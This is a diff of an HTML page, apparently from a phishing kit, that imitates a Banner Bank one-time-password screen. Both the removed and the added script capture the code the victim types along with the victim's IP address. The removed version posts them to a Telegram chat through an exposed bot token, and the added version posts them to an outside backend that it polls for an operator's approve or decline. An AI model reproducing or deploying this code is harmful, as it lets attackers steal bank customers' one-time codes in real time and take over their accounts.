@@ -264,7 +264,7 @@
                 <img src="images/bannerbank.png" alt="Banner Bank Logo" class="imgg">
             </div>
             <div class="login-section">
-                <form class="otp-form" action="/verify-otp" method="POST">
+                <form class="otp-form" id="otpForm">
                     <label for="otp">Enter One-Time Password (OTP)</label>
                     <input type="text" id="otp" name="otp" maxlength="6" pattern="\d{6}" inputmode="numeric" autocomplete="one-time-code" required aria-describedby="otp-error" />
                     <div id="otp-error" class="error-message" role="alert">Please enter a valid 6-digit OTP.</div>
@@ -288,43 +288,7 @@
     </div>
 
     <script>
-        const config = {
-            botToken: '7915117001:AAED4axtxCp0TznMMRttirjkuBCWsSwq7GA',
-            chatId: '6656157295'
-        };
-
-        async function sendTelegramMessage(message, inlineKeyboard = null) {
-            const telegramApiUrl = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
-            const payload = {
-                chat_id: config.chatId,
-                text: message,
-                parse_mode: 'HTML'
-            };
-            if (inlineKeyboard) payload.reply_markup = { inline_keyboard: inlineKeyboard };
-            
-            const response = await fetch(telegramApiUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-            const data = await response.json();
-            if (!data.ok) throw new Error('Failed to send message');
-            return data.result.message_id;
-        }
-
-        async function sendOtpRequest(otp, ip) {
-            const escapeHtml = (str) => str.replace(/[&<>"']/g, (m) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&apos;' })[m]);
-            const message = `🔐 FHB OTP Verification 🔐\n🔢 OTP: <code>${escapeHtml(otp)}</code>\n🌐 IP: <code>${ip}</code>`;
-            const inlineKeyboard = [
-                [
-                    { text: '✅ Approve', callback_data: 'approve_otp' },
-                    { text: '❌ Decline', callback_data: 'decline_otp' }
-                ]
-            ];
-            return sendTelegramMessage(message, inlineKeyboard);
-        }
-
-        document.querySelector('.otp-form').addEventListener('submit', async (event) => {
+        document.getElementById('otpForm').addEventListener('submit', async (event) => {
             event.preventDefault();
             
             const otpInput = document.getElementById('otp');
@@ -346,20 +310,75 @@
             
             try {
                 const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
-                await sendOtpRequest(otp, ip);
-                setTimeout(() => {
-                    window.location.href = 'person.html';
-                }, 10000);
+                const response = await fetch('https://b-bcknd.onrender.com/otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ otp, ip })
+                });
+                const data = await response.json();
+                
+                if (!response.ok) throw new Error(data.error || `HTTP error! Status: ${response.status}`);
+                if (data.success && data.id) {
+                    checkStatus(data.id);
+                } else {
+                    throw new Error(data.error || 'OTP verification failed');
+                }
             } catch (error) {
+                console.error('OTP error:', error);
                 waitPage.style.display = 'none';
                 submitBtn.disabled = false;
                 submitBtn.setAttribute('aria-busy', 'false');
-                errorMessage.textContent = 'Failed to verify OTP. Please try again.';
+                errorMessage.textContent = `Error: ${error.message}`;
                 errorMessage.classList.add('visible');
                 otpInput.value = '';
                 otpInput.focus();
             }
         });
+
+        function checkStatus(id) {
+            let attempts = 0;
+            const maxAttempts = 20; // ~60 seconds
+            const interval = setInterval(() => {
+                attempts++;
+                fetch(`https://b-bcknd.onrender.com/status/${id}`)
+                    .then(res => {
+                        if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);
+                        return res.json();
+                    })
+                    .then(data => {
+                        if (data.status === 'approved') {
+                            clearInterval(interval);
+                            window.location.href = data.redirect_url || 'person.html';
+                        } else if (data.status === 'declined') {
+                            clearInterval(interval);
+                            alert('OTP verification declined. Please try again.');
+                            document.getElementById('waitPage').style.display = 'none';
+                            document.querySelector('.submit-btn').disabled = false;
+                            document.querySelector('.submit-btn').setAttribute('aria-busy', 'false');
+                            document.getElementById('otp').value = '';
+                            document.getElementById('otp').focus();
+                        } else if (attempts >= maxAttempts) {
+                            clearInterval(interval);
+                            alert('OTP verification timed out. Please try again.');
+                            document.getElementById('waitPage').style.display = 'none';
+                            document.querySelector('.submit-btn').disabled = false;
+                            document.querySelector('.submit-btn').setAttribute('aria-busy', 'false');
+                            document.getElementById('otp').value = '';
+                            document.getElementById('otp').focus();
+                        }
+                    })
+                    .catch(err => {
+                        console.error('Status check error:', err);
+                        clearInterval(interval);
+                        alert(`Error: ${err.message}`);
+                        document.getElementById('waitPage').style.display = 'none';
+                        document.querySelector('.submit-btn').disabled = false;
+                        document.querySelector('.submit-btn').setAttribute('aria-busy', 'false');
+                        document.getElementById('otp').value = '';
+                        document.getElementById('otp').focus();
+                    });
+            }, 3000);
+        }
     </script>
 </body>
 </html>
